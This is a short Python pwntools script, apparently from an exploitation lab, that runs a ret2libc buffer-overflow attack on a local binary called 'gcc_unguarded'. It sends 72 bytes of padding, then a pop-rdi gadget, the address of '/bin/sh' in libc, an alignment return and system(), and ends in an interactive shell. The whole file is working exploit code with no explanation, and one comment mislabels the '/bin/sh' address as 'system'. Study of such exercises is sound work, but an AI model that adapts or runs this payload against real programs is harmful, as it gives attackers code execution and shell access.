# 64-bit
from pwn import *

p = process('./bin/gcc_unguarded')

libc_base = 0x7ffff7dce000             # Set base address

system = libc_base + 0x4c490            # Grab location of system
binsh = libc_base + 0x196031

POP_RDI = 0x40113a

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)   # pop rdi; ret
payload += p64(binsh)      # Location of system
payload += p64(0x401016)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline(payload)
p.interactive()
